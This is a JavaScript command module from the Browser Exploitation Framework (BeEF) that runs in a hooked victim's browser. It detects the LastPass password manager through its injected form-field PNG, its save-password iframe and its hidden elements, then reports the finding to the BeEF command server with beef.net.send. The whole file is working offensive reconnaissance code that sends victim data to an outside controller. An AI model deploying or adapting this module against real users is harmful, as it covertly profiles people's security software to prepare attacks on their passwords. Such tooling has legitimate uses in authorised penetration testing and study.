//
// Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * BeEF JS Library <%= @beef_version %>
 * Register the BeEF JS on the window object.
 */

$j = jQuery.noConflict();

beef.execute(function() {
	var result = "Not in use or not installed";

	//The following bas64 encoded string represents the LastPass inline PNG which is inserted into user/pass form fields
	var base64PNG = "iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC";

	//Detect input form fields with the injected LastPass PNG as background image
	var bginput =  $j('input[style]');
	if (bginput.length > 0) {
		beef.debug('input field with \'style\' attribute found: ' + bginput);
		for(var i = 0; i < bginput.length; i++) {
			beef.debug('Number of potential input fields with \'style\' attribute found: ' + bginput.length);
			var styleContent = bginput[i].getAttribute('style');
			if (styleContent.includes(base64PNG)) {
				beef.debug('Matching inline PNG detected');
				result = "Detected LastPass through presence of inline base64-encoded PNG within input form field";
			}
		}
	}

	//Detect presence of LastPass iframe
	if ($j("iframe[name='LPFrame']").length > 0) {
		beef.debug('Matching iframe found');
		result = "Detected LastPass through presence of LastPass 'save password' iframe";
	}

	//Previous detection methods
	var lpdiv = document.getElementById('hiddenlpsubmitdiv');
	if (typeof(lpdiv) != 'undefined' && lpdiv != null) {
		//We've got the first detection of LP
		result = "Detected LastPass through presence of the <script> tag with id=hiddenlpsubmitdiv";
	} else if ($j("script:contains(lastpass_iter)").length > 0) {
		//We've got the second detection of LP
		result = "Detected LastPass through presense of the embedded <script> which includes references to lastpass_iter";
	} 

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "lastpass="+result);
});
